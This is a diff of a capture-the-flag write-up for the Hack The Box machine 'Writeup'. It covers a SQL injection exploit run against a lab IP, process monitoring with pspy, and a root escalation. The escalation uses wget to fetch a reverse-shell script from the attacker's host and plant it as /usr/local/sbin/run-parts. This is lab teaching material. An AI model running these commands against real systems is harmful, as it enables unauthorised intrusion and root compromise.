@@ -56,7 +56,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 ~~~
 
 
-Opening up the webpage in the browser shows a static HTML page stating that the website is still under construction and that it was a mockup of a Hackthebox Writeup blog.
+Opening up the webpage in the browser shows a static HTML page stating that the website is still under construction.
 
 
 
@@ -110,7 +110,9 @@ Quite quickly, we can narrow down which scripts are not applicable to this box.
 
 
 
+
 For the remainder, we can see what remains:
+
 
 - Green - We can probably try these first, usually the 'Verified'(checkmark on "V") ones are preferred, but there are none in this case
 - Orange - Stuff with "Multiple Vulnerabilities", we may need to read those to see which may be useful
@@ -140,21 +142,9 @@ Trying to run it shows instructions how to use it:
 ![1570847484045](https://github.com/Dreamscent/Dreamscent.github.io/raw/master/images/Writeup/1570847484045.png)
 
 
-OR
 
 ~~~bash
-root@kali:~/0x4a/Hackthebox/Writeup# python 46635.py
-[+] Specify an url target
-[+] Example usage (no cracking password): exploit.py -u http://target-uri                                                       
-[+] Example usage (with cracking password): exploit.py -u http://target-uri --crack -w /path-wordlist                           
-[+] Setup the variable TIME with an appropriate time, because this sql injection is a time based. 
-~~~
-
-
-
-~~~bash
-python 46635.py -u http://10.10.10.138
-# Supplying the above parameter failed, so we can try perhaps to include the /writeup directory as it may not have been able to access the SQL injection parameters from the web root
+python 46635.py -u http://10.10.10.138 # This one failed, so we can try perhaps to include the /writeup directory as it may not have been able to access the SQL injection parameters from the web root
 
 python 46635.py -u http://10.10.10.138/writeup
 ~~~
@@ -206,7 +196,7 @@ In the initial nmap scan, we found out that SSH was open, so can try it there:
 
 
 
-### Close your eyes and listen
+### The quieter you are, the more you can hear
 
 
 
@@ -214,15 +204,10 @@ My usual enumeration script `lse.sh` did not return anything, of interest. No cr
 
 
 
-There was this phrase on the Kali Linux website somewhere:
+There was this phrase on the Kali Linux website somewhere which seems applicable here:
 
 
-
-> The quieter you are, the more you can hear
-
-
-
-In some cases, there may be cronjobs or scheduled tasks running  on the server but are not listed when you run your enumeration scripts. These may be because of a lack of permissions. To get around this, we can run [pspy][3].
+In some cases, there may be cronjobs or scheduled tasks running  on the server but are not listed when you run your enumeration scripts. These may be because of a lack of permissions. To get around this, we can run [pspy][3]. This binary when run, will show all events happening in real time.
 
 
 
@@ -362,6 +347,14 @@ We then transfer the file to `/tmp` directory(since it's usually world writable)
 
 
 
+
+
+
+
+![1570853415374](https://github.com/Dreamscent/Dreamscent.github.io/raw/master/images/Writeup/1570853415374.png)
+
+
+For your copy paste pleasure:
 ```bash
 # on our attacking machine
 python -m SimpleHTTPServer 1234
@@ -371,17 +364,6 @@ wget 10.10.16.53:1234/tcp_pty_backconnect.py
 echo python /tmp/tcp_pty_backconnect.py > /usr/local/sbin/run-parts
 chmod +x /usr/local/sbin/run-parts
 ```
-
-
-
-OR
-
-
-
-![1570853415374](https://github.com/Dreamscent/Dreamscent.github.io/raw/master/images/Writeup/1570853415374.png)
-
-
-
 
 
 Then, open a new terminal window/tab and SSH back in with our credentials to trigger the event. If we look at the listener we set up previously, we should get a root shell! Reading the `root.txt` file is possible now.
